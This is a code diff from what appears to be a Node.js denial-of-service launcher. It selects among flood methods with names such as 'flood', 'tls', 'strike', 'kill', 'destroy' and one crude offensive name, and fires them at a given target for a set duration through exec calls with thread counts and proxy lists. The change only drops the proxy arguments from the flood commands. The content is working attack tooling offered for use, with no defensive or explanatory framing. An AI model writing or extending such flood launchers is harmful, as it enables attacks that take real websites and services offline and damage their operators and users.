@@ -253,7 +253,7 @@ AS       : ${result.as}
 const metode = path.join(__dirname, `/lib/cache/${methods}`);
   if (methods === 'flood') {
    pushOngoing(target, methods, duration)
-   exec(`node ${metode} ${target} ${duration} 100 proxy.txt`)
+   exec(`node ${metode} ${target} ${duration}`)
 	sigma()
   } else if (methods === 'tls') {
     pushOngoing(target, methods, duration)
@@ -305,7 +305,7 @@ const rape = path.join(__dirname, `/lib/cache/rape.js`);
 const storm = path.join(__dirname, `/lib/cache/storm.js`);
 const destroy = path.join(__dirname, `/lib/cache/destroy.js`);
 const flooder = path.join(__dirname, `/lib/cache/flooder.js`);
-        exec(`node ${flood} ${target} ${duration} 100 proxy.txt`)
+        exec(`node ${flood} ${target} ${duration}`)
         exec(`node ${tls} ${target} ${duration} 100 100`)
         exec(`node ${strike} GET ${target} ${duration} 100 100 proxy.txt`)
 	exec(`node ${kill} ${target} ${duration} 100 20`)
